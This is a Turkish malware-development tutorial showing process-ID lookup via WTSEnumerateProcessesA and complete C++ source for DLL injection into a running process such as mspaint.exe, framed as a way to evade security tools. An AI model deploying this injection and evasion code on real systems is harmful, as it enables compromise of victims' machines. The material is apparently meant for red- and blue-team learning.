\newpage
\subsection{45. kötü amaçlı yazılım geliştirme hilesi: WTSEnumerateProcesses kullanarak PID bulma. Basit C++ örneği.}

﷽

![hack](./images/103/2023-07-07_12-08_1.png){width="80%"}      

Bugün, araştırmamı başka bir kötü amaçlı yazılım geliştirme hilesine odaklamak istiyorum: `WTSEnumerateProcesses` kullanarak süreçleri enumere etmek ve `PID` bulmak. Bu, antivirüslerden kaçınmak için kötü amaçlı yazılımlar tarafından da kullanılabilen yaygın bir tekniktir.     

### WTSEnumerateProcessesA win api

`WTSEnumerateProcessesA` fonksiyonu, belirtilen bir terminal sunucusundaki aktif süreçler hakkında bilgi almak için kullanılan bir Windows API fonksiyonudur:

```cpp
BOOL WTSEnumerateProcessesA(
  WTS_CURRENT_SERVER_HANDLE hServer,
  DWORD                     Reserved,
  DWORD                     Version,
  PWTS_PROCESS_INFOA        *ppProcessInfo,
  DWORD                     *pdwCount
);
```

`WTSEnumerateProcessesA`, öncelikli olarak bir terminal sunucusunda çalışan süreçleri listelemek için kullanılır ve teşhis ve hata ayıklama işlemlerinde faydalı olabilir.   

### pratik örnek

WTS API fonksiyonları `wtsapi32.dll` kütüphanesinin bir parçasıdır, bu yüzden bu DLL'e karşı bağlantı kurmamız gerekir.Kod parçacığında:   

```cpp
#pragma comment(lib, "wtsapi32.lib")
```

Bu satır, `wtsapi32.lib` kütüphanesine bağlantı eklemek için kullanılır.    

Ardından, süreçleri listelemek için bir fonksiyon oluşturalım:    

```cpp
int findMyProc(const char * procname) {
  int pid = 0;
  WTS_PROCESS_INFOA * pi;

  DWORD level = 1; // we want WTSEnumerateProcesses to return WTS_PROCESS_INFO_EX
  DWORD count = 0;

  if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, level, &pi, &count))
    return 0;

  for (int i = 0 ; i < count ; i++ ) {
    if (lstrcmpiA(procname, pi[i].pProcessName) == 0) {
      pid = pi[i].ProcessId;
      break;
    }
  }

  WTSFreeMemory(pi);
  return pid;
}
```

Gördüğünüz gibi, mantık oldukça basittir: süreç adını karşılaştırın ve PID'yi alın.   

Tam kaynak kodu şu şekildedir (`hack.c`):    

```cpp
/*
 * process find via WTSEnumerateProcessesA logic
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2023/07/07/malware-tricks-34.html
*/
#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>
#pragma comment(lib, "wtsapi32.lib")

int findMyProc(const char * procname) {
  int pid = 0;
  WTS_PROCESS_INFOA * pi;

  DWORD level = 1; // we want WTSEnumerateProcesses to return WTS_PROCESS_INFO_EX
  DWORD count = 0;

  if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, level, &pi, &count))
    return 0;

  for (int i = 0 ; i < count ; i++ ) {
    if (lstrcmpiA(procname, pi[i].pProcessName) == 0) {
      pid = pi[i].ProcessId;
      break;
    }
  }

  WTSFreeMemory(pi);
  return pid;
}

int main(int argc, char* argv[]) {
  int pid = findMyProc(argv[1]);
  if (pid > 0) {
  printf("pid = %d\n", pid);
  }
  return 0;
}
```


Unutmayın ki bu fonksiyon, sistem süreçleri veya belirli güvenlik yazılımları tarafından korunan süreçler gibi bazı süreçlerin kimliğini (PID) alamayabilir. Ayrıca, belirli güvenlik yazılımları bu fonksiyona yapılan çağrıları tamamen engelleyebilir. Aynı durum, kısıtlı izinlere sahip bir ortamda çalışıyorsanız da geçerlidir.      

Bunun yanında, `WTSEnumerateProcesses` fonksiyonunun çalışması için `SeTcbPrivilege` yetkisinin etkin olması gerekir. Ancak bu yetki genellikle yönetici hesapları için zaten etkindir—bunu test etmedim.     

### demo

Tamam, bu yöntemi çalışırken görelim.    

Derleyelim (`hack.c`):    


```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections -Wno-write-strings 
-fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lwtsapi32
```

![hack](./images/103/2023-07-07_12-05.png){width="80%"}      

Gördüğünüz gibi, bu programı derlerken `wtsapi32.lib` bağlantısını eklemeniz gerekiyor.
Ben GCC tabanlı bir derleyici (örneğin `MinGW`) kullanıyorum, bu yüzden aşağıdaki gibi `-lwtsapi32` bayrağını ekleyerek derleyebilirim.      

Ardından, sadece hedef sistemde (benim durumumda `Windows 10 22H2 x64`) çalıştırın:    

```powershell
.\hack.exe <process>
```

![hack](./images/103/2023-07-07_12-06.png){width="80%"}      

![hack](./images/103/2023-07-07_12-07.png){width="80%"}      

![hack](./images/103/2023-07-07_12-08.png){width="80%"}      

Gördüğünüz gibi, her şey beklendiği gibi mükemmel çalıştı! :) =^..^=    

Daha önce yazdığım gibi, teorik olarak, kullanıcının Query Information iznine sahip olması gerekir. Ayrıca, çağıran sürecin `SE_TCB_NAME` ayrıcalığına sahip olması gerekir.
Eğer çağıran süreç bir kullanıcı oturumunda çalışıyorsa, `WTSEnumerateProcesses` işlevi yalnızca o oturumun süreç bilgilerini alacaktır.     

Benim fikrimce, eğer zararlı yazılımınız veya hizmetiniz Local System altında çalışıyorsa, gerekli tüm izinlere sahip olursunuz.    

Ayrıca, bu teknik bazı siber güvenlik çözümlerini atlatmak için kullanılabilir, çünkü birçok sistem `CreateToolhelp32Snapshot`, `Process32First`, `Process32Next` gibi yaygın işlevleri algılar.Bu nedenle, birçok zararlı yazılım analisti için tespit edilmesi zor olabilir.     

### pratik örnek 2. process ID bul ve DLL enjekte et

Şimdi, kötü niyetli bir mantığa sahip başka bir örneğe geçelim.     
Belirli bir süreç adını kullanarak Process ID'yi bulalım ve içine DLL enjekte edelim.    

Kaynak kodu, [önceki](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html) [paylaşımlarımla](https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html) neredeyse aynı, sadece `findMyProc` işlevinin mantığı farklı (`hack2.c`):    

```cpp
/*
 * hack2.cpp - find process ID
 * by WTSEnumerateProcessesA and
 * DLL inject. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/07/07/malware-tricks-34.html
*/
#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>
#pragma comment(lib, "wtsapi32.lib")

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int findMyProc(const char * procname) {
  int pid = 0;
  WTS_PROCESS_INFOA * pi;

  DWORD level = 1; // we want WTSEnumerateProcesses to return WTS_PROCESS_INFO_EX
  DWORD count = 0;

  if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, level, &pi, &count))
    return 0;

  for (int i = 0 ; i < count ; i++ ) {
    if (lstrcmpiA(procname, pi[i].pProcessName) == 0) {
      pid = pi[i].ProcessId;
      break;
    }
  }

  WTSFreeMemory(pi);
  return pid;
}

int main(int argc, char* argv[]) {
  int pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer
  pid = findMyProc(argv[1]);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);

  HMODULE hKernel32 = GetModuleHandle("kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // open process
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
  if (ph == NULL) {
    printf("OpenProcess failed! exiting...\n");
    return -2;
  }

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), 
  PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, 
  NULL);
  CloseHandle(ph);

  return 0;
}
```

### "zararlı yazılım" demosu

Tamam, şimdi enjeksiyonumuzu gösterelim.    

Öncelikle, kodumuzu derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -lwtsapi32
```

![av-evasion](./images/103/2023-07-08_20-09.png){width="80%"}      

Ve şimdi `mspaint.exe` sürecini bulup zararlı DLL’imizi enjekte etmek için çalıştıralım:   

```powershell
.\hack2.exe mspaint.exe
```

![av-evasion](./images/103/2023-07-08_20-19.png){width="80%"}      

Gördüğünüz gibi, mesaj kutumuz `mspaint.exe` sürecine `PID = 3048` ile enjekte edildi, beklendiği gibi. Mükemmel! =^..^=     

Bu teknik, İranlı [CopyKittens](https://attack.mitre.org/groups/G0052/) siber casusluk grubu tarafından kullanılmaktadır. Umarım bu yazı, mavi takım üyelerinin bu ilginç zararlı yazılım geliştirme tekniği hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.     

[WTSEnumerateProcessesA](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsenumerateprocessesa)       
[Find PID by name and inject to it. "Classic" implementation.](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)       
[Classic DLL injection into the process. Simple C++ malware](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)        
[Taking a Snapchot and Viewing Processes](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)       
[CopyKittens](https://attack.mitre.org/groups/G0052/)     
[Malpedia: CopyKittens](https://malpedia.caad.fkie.fraunhofer.de/actor/copykittens)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-07-07-malware-trick-34)           
